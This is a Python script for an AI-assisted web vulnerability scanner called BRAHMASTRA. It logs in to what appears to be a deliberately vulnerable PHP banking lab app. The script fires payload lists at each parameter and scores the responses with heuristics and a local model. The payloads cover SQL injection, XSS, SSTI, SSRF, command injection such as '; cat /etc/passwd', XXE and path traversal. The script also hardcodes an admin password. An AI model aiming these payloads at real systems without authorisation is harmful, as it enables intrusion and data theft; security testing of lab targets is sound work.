"""
BRAHMASTRA — Full Authenticated Deep Scan of phpvulnbank
Crawls all pages, tests every parameter for every vulnerability class.
ALL vulnerability intelligence from Brahmastra model only.
"""
import asyncio, json, re, sys
from datetime import datetime
from urllib.parse import urljoin, urlparse

import httpx

TARGET      = "https://192.168.68.58"
USERNAME    = "admin"
PASSWORD    = "krishna1$"
MODEL_URL   = "http://localhost:11435/api/chat"
MODEL_NAME  = "brahmastra"
REPORT_PATH = "/tmp/full_scan2.json"
VERIFY_SSL  = False

# ── All discovered test points (complete phpvulnbank coverage) ────────────────
#  {url, param, method, vuln_hint}  vuln_hint = priority vuln types to test
KNOWN_ENDPOINTS = [
    # Login page
    {"url": "/login.php",       "param": "uname",   "method": "POST"},
    {"url": "/login.php",       "param": "pwd",     "method": "POST"},

    # Registration — XML endpoint (XXE likely)
    {"url": "/api/regxml.php",  "param": "name",    "method": "POST"},
    {"url": "/api/regxml.php",  "param": "pwd",     "method": "POST"},
    {"url": "/api/regxml.php",  "param": "email",   "method": "POST"},
    {"url": "/api/regxml.php",  "param": "tel",     "method": "POST"},

    # Registration — JSON endpoint
    {"url": "/api/regjson.php", "param": "name",    "method": "POST"},
    {"url": "/api/regjson.php", "param": "pwd",     "method": "POST"},
    {"url": "/api/regjson.php", "param": "email",   "method": "POST"},
    {"url": "/api/regjson.php", "param": "tel",     "method": "POST"},

    # Transfer money — IDOR / SQLi likely
    {"url": "/transfer.php",    "param": "tacno",   "method": "POST"},
    {"url": "/transfer.php",    "param": "tamount", "method": "POST"},

    # Display data — IDOR (account lookup by ID)
    {"url": "/displaydata.php", "param": "aid",     "method": "GET"},

    # Activate user
    {"url": "/activate.php",    "param": "user",    "method": "POST"},

    # File upload (path traversal, file type bypass)
    {"url": "/fileupload.php",  "param": "image",   "method": "POST", "file": True},
]

# ── Payloads ──────────────────────────────────────────────────────────────────
PAYLOADS = {
    "SQLi": [
        "' OR '1'='1'--",
        "' OR 1=1--",
        "' UNION SELECT 1,2,3--",
        "1' AND SLEEP(3)--",
        "admin'--",
        "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    ],
    "XSS": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "'><script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "\"><img src=x onerror=alert(1)>",
    ],
    "SSTI": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{config.items()}}",
    ],
    "SSRF": [
        "http://127.0.0.1/",
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:22/",
        "file:///etc/passwd",
    ],
    "IDOR": [
        "2", "3", "0", "9999", "100",
        "../admin", "admin",
    ],
    "CMD": [
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
        "1; ls -la /",
    ],
    "XXE": [
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><r>&xxe;</r>',
    ],
    "OpenRedirect": [
        "//evil.com",
        "https://evil.com",
        "/\\evil.com",
    ],
    "PathTraversal": [
        "../../etc/passwd",
        "../../../etc/passwd",
        "....//....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        "..%2F..%2Fetc%2Fpasswd",
    ],
}

# ── Heuristics ────────────────────────────────────────────────────────────────
SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "you have an error in your sql",
    "warning: mysql", "invalid query", "unclosed quotation",
    "pg_exec", "ora-0", "sqlite_", "db2_", "syntax error",
    "supplied argument is not", "odbc driver", "sql server",
    "microsoft ole db", "division by zero", "quoted string not properly terminated",
    "mysql_num_rows", "mysql_result", "pg_query",
]
XSS_MARKERS   = ["<script>alert(1)</script>", "onerror=alert(", "onload=alert(", "svg onload="]
SSTI_RESULTS  = ["49", "7777777"]
CMD_MARKERS   = ["uid=", "root:x:", "/bin/bash", "/bin/sh", "total ", "drwxr"]
XXE_MARKERS   = ["root:x:0:0", "daemon:", "nobody:", "/sbin/nologin"]
PTRAV_MARKERS = ["root:x:0:0", "daemon:", "nobody:"]

def heuristic(payload_val: str, vuln_type: str, body: str, status: int) -> tuple[bool, str]:
    b = body.lower()
    if vuln_type == "SQLi":
        for e in SQLI_ERRORS:
            if e in b:
                return True, f"SQL error in response: '{e}'"
    if vuln_type == "XSS":
        for m in XSS_MARKERS:
            if m.lower() in b:
                return True, "XSS payload reflected unescaped in response"
    if vuln_type == "SSTI":
        for r in SSTI_RESULTS:
            if r in body:
                return True, f"SSTI confirmed: expression evaluated to '{r}'"
    if vuln_type == "CMD":
        for m in CMD_MARKERS:
            if m in body:
                return True, f"Command injection: output '{m}' found in response"
    if vuln_type == "XXE":
        for m in XXE_MARKERS:
            if m in body:
                return True, f"XXE: file content leaked — '{m}' in response"
    if vuln_type == "PathTraversal":
        for m in PTRAV_MARKERS:
            if m in body:
                return True, f"Path traversal: '{m}' leaked in response"
    return False, ""

# ── Model ─────────────────────────────────────────────────────────────────────
# Phrases that indicate the model has no real evidence — reject these
WEAK_EVIDENCE_PHRASES = [
    "no clear evidence", "no evidence", "access denied",
    "response contains no error", "response contains no additional",
    "not vulnerable", "no redirect", "no user-controlled",
    "does not contain", "no indication", "could not confirm",
    "no clear sign", "no obvious", "unable to confirm",
    "response does not", "no apparent", "inconclusive",
]

# Vuln types that MUST have heuristic proof — model alone not enough
REQUIRE_HEURISTIC = {"SSRF", "IDOR", "OpenRedirect", "CMD", "XXE", "PathTraversal"}

SYSTEM_BRAHMASTRA = """You are BRAHMASTRA, an elite DAST security scanner.
Analyze the HTTP response and determine if the injection was successful.

STRICT RULES — READ CAREFULLY:
1. Call report_finding() ONLY if you see DIRECT PROOF in the response body:
   - SQLi:          actual SQL error text (mysql_fetch, syntax error, ORA-, warning: mysql, etc.)
   - XSS:           the exact payload string reflected unescaped in HTML (e.g. <script>alert found in body)
   - SSTI:          the evaluated result in the body (e.g. 49 for {{7*7}}, 7777777 for )
   - CMD Injection: uid=, root:x:, /bin/bash output literally visible in response body
   - XXE:           actual file content (root:x:0:0, daemon:, /sbin/nologin) visible in response
   - IDOR:          data belonging to a DIFFERENT user returned (name, account, hash visible)
   - SSRF:          internal network content, EC2 metadata, or connection error exposing internal IPs
   - Path Traversal: /etc/passwd content (root:, daemon:) visible in response body
   - Open Redirect:  response redirects to the injected external domain

2. If the response is just a normal page, login form, error page, or empty — call mark_clean().
3. NEVER report a finding based on:
   - "access denied" responses
   - "no error message displayed"
   - payload being reflected in an input value= attribute (that is NOT XSS proof alone)
   - generic error pages with no SQL/command/file content
4. If you are not 100% certain from the response text — call mark_clean().
5. evidence= field MUST contain an EXACT QUOTE from the response body proving the vulnerability.

Respond with exactly ONE tool call:
  report_finding(severity="HIGH", type="SQL Injection", url="/path", parameter="param", evidence="EXACT QUOTE from response", cvss=8.5, remediation="Use parameterized queries")
  mark_clean(url="/path", parameter="param", reason="no SQL error/XSS reflection/file content in response")

Only output English. No explanation outside the tool call."""

async def ask_brahmastra(url, param, method, vuln_type, payload_val, status, body) -> dict|None:
    msg = f"""Payload injected: {payload_val!r}
Vuln type tested: {vuln_type}
Request: {method} {url} — parameter: {param!r}

HTTP Response (status {status}):
{body[:900]}

Is there clear evidence of {vuln_type} in this response?"""
    try:
        async with httpx.AsyncClient(timeout=90.0) as c:
            r = await c.post(MODEL_URL, json={
                "model": MODEL_NAME,
                "messages": [
                    {"role": "system", "content": SYSTEM_BRAHMASTRA},
                    {"role": "user",   "content": msg},
                ],
                "stream": False,
                "options": {"temperature": 0.05, "num_predict": 400},
            })
            r.raise_for_status()
            out = r.json()["message"]["content"]
        m = re.search(r'report_finding\(([^)]+)\)', out, re.DOTALL)
        if not m: return None
        a = m.group(1)
        def ga(k, d=""):
            p = re.search(rf'{k}=["\']([^"\']*)["\']', a)
            if p: return p.group(1)
            p = re.search(rf'{k}=([\d.]+)', a)
            return p.group(1) if p else d
        evidence_text = ga("evidence", "")
        if any(phrase in evidence_text.lower() for phrase in WEAK_EVIDENCE_PHRASES):
            print(f"      [Filter] Rejected weak evidence: {evidence_text[:80]!r}")
            return None
        if not evidence_text:
            return None
        return {
            "severity":    ga("severity", "MEDIUM"),
            "type":        ga("type", vuln_type),
            "evidence":    evidence_text,
            "cvss":        float(ga("cvss", "6.5")),
            "remediation": ga("remediation", "Sanitize all user input"),
        }
    except Exception as e:
        print(f"      [Model err] {e}")
        return None

# ── HTTP Session ──────────────────────────────────────────────────────────────
class Session:
    def __init__(self):
        self.cookies = {}
        self.hdrs = {"User-Agent": "Brahmastra/1.0"}
        self.count = 0

    async def login(self):
        url = TARGET + "/login.php"
        async with httpx.AsyncClient(verify=VERIFY_SSL, follow_redirects=False, timeout=15) as c:
            r = await c.post(url, data={"uname": USERNAME, "pwd": PASSWORD}, headers=self.hdrs)
            for k, v in r.cookies.items():
                self.cookies[k] = v
            if r.status_code in (301,302):
                loc = TARGET + "/" + r.headers.get("location","").lstrip("/")
                r2 = await c.get(loc, cookies=self.cookies, headers=self.hdrs)
                for k,v in r2.cookies.items():
                    self.cookies[k] = v
        ok = bool(self.cookies)
        print(f"  [Auth] {'OK' if ok else 'FAILED'} — session: {list(self.cookies.keys())}")
        return ok

    async def request(self, method, url, params=None, data=None) -> tuple[int,str]:
        self.count += 1
        try:
            async with httpx.AsyncClient(verify=VERIFY_SSL, follow_redirects=True, timeout=15) as c:
                if method == "GET":
                    r = await c.get(url, params=params, cookies=self.cookies, headers=self.hdrs)
                else:
                    r = await c.post(url, data=data or {}, cookies=self.cookies, headers=self.hdrs)
            return r.status_code, r.text[:2000]
        except Exception as e:
            return 0, str(e)

# ── Scanner ───────────────────────────────────────────────────────────────────
CVSS_MAP = {
    "SQLi": (9.8,"CRITICAL"), "XSS": (6.1,"MEDIUM"), "SSTI": (9.0,"CRITICAL"),
    "SSRF": (8.6,"HIGH"),     "CMD": (9.8,"CRITICAL"), "XXE": (8.2,"HIGH"),
    "IDOR": (7.5,"HIGH"),     "OpenRedirect": (6.1,"MEDIUM"), "PathTraversal": (7.5,"HIGH"),
}
REMED = {
    "SQLi":          "Use parameterized queries. Never concatenate user input into SQL strings.",
    "XSS":           "HTML-encode all output. Set Content-Security-Policy: default-src 'self'.",
    "SSTI":          "Never render user input through template engines. Use static templates.",
    "SSRF":          "Whitelist allowed URLs. Block 127.0.0.1, 169.254.0.0/16, 10.0.0.0/8.",
    "CMD":           "Never pass user input to shell commands. Use subprocess with argument lists.",
    "XXE":           "Disable external entity loading: libxml_disable_entity_loader(true) in PHP.",
    "IDOR":          "Enforce server-side ownership checks before returning any user-specific data.",
    "OpenRedirect":  "Validate redirect targets against a whitelist of allowed domains.",
    "PathTraversal": "Resolve canonical paths and verify they start with the allowed base directory.",
}

# Which vuln types to test per param (based on param name hints + always test these)
ALWAYS_TEST   = ["SQLi", "XSS", "SSTI"]
HINT_MAP = {
    ("id","uid","account","aid","no","num","acno","tacno"):  ["IDOR","SQLi"],
    ("url","uri","redirect","next","dest","return","link"):  ["SSRF","OpenRedirect"],
    ("file","path","dir","page","template","doc","name"):    ["PathTraversal"],
    ("cmd","exec","run","ping","host","ip"):                 ["CMD"],
    ("xml","data","body","payload","input"):                 ["XXE"],
    ("amount","tamount","balance","price"):                  ["SQLi","IDOR"],
    ("email","mail"):                                        ["SQLi","XSS"],
}

def vuln_order_for(param: str) -> list[str]:
    p = param.lower()
    ordered = []
    for keys, types in HINT_MAP.items():
        if any(k in p for k in keys):
            ordered.extend(types)
    ordered.extend(ALWAYS_TEST)
    ordered.extend([v for v in PAYLOADS if v not in ordered])
    return list(dict.fromkeys(ordered))  # dedup, preserve order

async def scan_param(session: Session, ep: dict) -> list[dict]:
    full_url = TARGET + ep["url"]
    path     = ep["url"]
    param    = ep["param"]
    method   = ep["method"]
    findings = []

    for vuln_type in vuln_order_for(param):
        if ep.get("file") and vuln_type not in ("XXE", "PathTraversal", "CMD"):
            continue  # file upload — only relevant types
        payloads_to_try = PAYLOADS.get(vuln_type, [])[:4]
        confirmed = False
        for pld in payloads_to_try:
            if method == "GET":
                status, body = await session.request("GET", full_url, params={param: pld})
            else:
                status, body = await session.request("POST", full_url, data={param: pld})

            if status == 0:
                continue

            # 1. Heuristic
            vuln, evidence = heuristic(pld, vuln_type, body, status)

            # 2. Ask Brahmastra if heuristic says clean
            if not vuln:
                if vuln_type in REQUIRE_HEURISTIC:
                    pass  # hard-proof types: skip model, heuristic only
                else:
                    result = await ask_brahmastra(full_url, param, method, vuln_type, pld, status, body)
                    if result:
                        vuln     = True
                        evidence = result.get("evidence", "Brahmastra detected anomaly")

            if vuln:
                cvss, sev = CVSS_MAP.get(vuln_type, (6.5,"MEDIUM"))
                f = {
                    "severity":    sev,
                    "type":        vuln_type,
                    "url":         path,
                    "full_url":    full_url,
                    "parameter":   param,
                    "method":      method,
                    "payload":     pld,
                    "evidence":    evidence,
                    "cvss":        cvss,
                    "remediation": REMED.get(vuln_type, "Sanitize all user input."),
                    "timestamp":   datetime.utcnow().isoformat(),
                }
                findings.append(f)
                print(f"  [!!!] {sev:<9} {vuln_type:<16} @ {path} [{param}]")
                print(f"         payload  : {str(pld)[:70]!r}")
                print(f"         evidence : {evidence[:130]}")
                confirmed = True
                break

        if not confirmed:
            print(f"        clean   {vuln_type:<16} @ {path} [{param}]")

    return findings

# ── Main ──────────────────────────────────────────────────────────────────────
async def main():
    started = datetime.utcnow()
    print("=" * 72)
    print("  BRAHMASTRA — Full Authenticated Deep Scan")
    print(f"  Target  : {TARGET}")
    print(f"  Auth    : {USERNAME} / {'*'*len(PASSWORD)}")
    print(f"  Model   : {MODEL_NAME} @ {MODEL_URL}")
    print(f"  Scope   : {len(KNOWN_ENDPOINTS)} parameters across {len(set(e['url'] for e in KNOWN_ENDPOINTS))} endpoints")
    print("=" * 72)

    session = Session()
    print("\n[1] Authenticating...")
    await session.login()

    print(f"\n[2] Scanning {len(KNOWN_ENDPOINTS)} parameters...\n")
    all_findings = []
    seen_f = set()

    for i, ep in enumerate(KNOWN_ENDPOINTS, 1):
        if ep.get("file"):
            print(f"\n  [{i:02d}/{len(KNOWN_ENDPOINTS)}] {ep['method']} {ep['url']} — {ep['param']!r} [file upload — skip for now]")
            continue
        print(f"\n  [{i:02d}/{len(KNOWN_ENDPOINTS)}] {ep['method']} {ep['url']} — param: {ep['param']!r}")
        findings = await scan_param(session, ep)
        for f in findings:
            key = f"{f['url']}|{f['parameter']}|{f['type']}"
            if key not in seen_f:
                seen_f.add(key)
                all_findings.append(f)

    # Sort by CVSS desc
    sev_ord = {"CRITICAL":4,"HIGH":3,"MEDIUM":2,"LOW":1}
    all_findings.sort(key=lambda x: sev_ord.get(x["severity"],0), reverse=True)

    # ── Summary ───────────────────────────────────────────────────────────────
    counts = {}
    for f in all_findings:
        counts[f["severity"]] = counts.get(f["severity"],0) + 1

    print("\n" + "=" * 72)
    print("  BRAHMASTRA SCAN COMPLETE")
    print(f"  Duration        : {(datetime.utcnow()-started).seconds}s")
    print(f"  HTTP Requests   : {session.count}")
    print(f"  Params Tested   : {len(KNOWN_ENDPOINTS)}")
    print(f"  Vulnerabilities : {len(all_findings)}")
    for sev in ("CRITICAL","HIGH","MEDIUM","LOW"):
        n = counts.get(sev,0)
        if n: print(f"    {sev:<10}: {n}")
    print("=" * 72)

    # ── Findings Table ────────────────────────────────────────────────────────
    print("\n  VULNERABILITY REPORT")
    print("  " + "─"*70)
    print(f"  {'#':<4}{'SEV':<10}{'TYPE':<18}{'ENDPOINT':<22}{'PARAM':<12}{'CVSS':<6}{'METHOD'}")
    print("  " + "─"*70)
    for i, f in enumerate(all_findings,1):
        print(f"  {i:<4}{f['severity']:<10}{f['type']:<18}{f['url']:<22}{f['parameter']:<12}{f['cvss']:<6}{f['method']}")
    print("  " + "─"*70)

    # ── Detailed Findings ─────────────────────────────────────────────────────
    print("\n  DETAILED FINDINGS\n")
    for i, f in enumerate(all_findings,1):
        sev_bar = {"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡","LOW":"🟢"}.get(f['severity'],"⚪")
        print(f"  [{i}] {f['severity']} — {f['type']}")
        print(f"       URL       : {f['full_url']}")
        print(f"       Parameter : {f['parameter']}  ({f['method']})")
        print(f"       Payload   : {str(f['payload'])[:80]!r}")
        print(f"       Evidence  : {f['evidence'][:160]}")
        print(f"       CVSS      : {f['cvss']}")
        print(f"       Fix       : {f['remediation']}")
        print()

    # ── JSON Report ───────────────────────────────────────────────────────────
    report = {
        "tool":           "BRAHMASTRA AI-Native DAST Scanner v1.0",
        "scan_id":        f"brahmastra-{started.strftime('%Y%m%d-%H%M%S')}",
        "target":         TARGET,
        "authenticated":  True,
        "credentials":    {"username": USERNAME},
        "started_at":     started.isoformat(),
        "finished_at":    datetime.utcnow().isoformat(),
        "duration_sec":   (datetime.utcnow()-started).seconds,
        "total_requests": session.count,
        "params_tested":  len(KNOWN_ENDPOINTS),
        "pages_covered":  list(set(e["url"] for e in KNOWN_ENDPOINTS)),
        "summary":        {"total": len(all_findings), **{k.lower(): v for k,v in counts.items()}},
        "findings":       all_findings,
    }
    with open(REPORT_PATH,"w") as f:
        json.dump(report, f, indent=2)
    print(f"  JSON report saved: {REPORT_PATH}")

if __name__ == "__main__":
    asyncio.run(main())
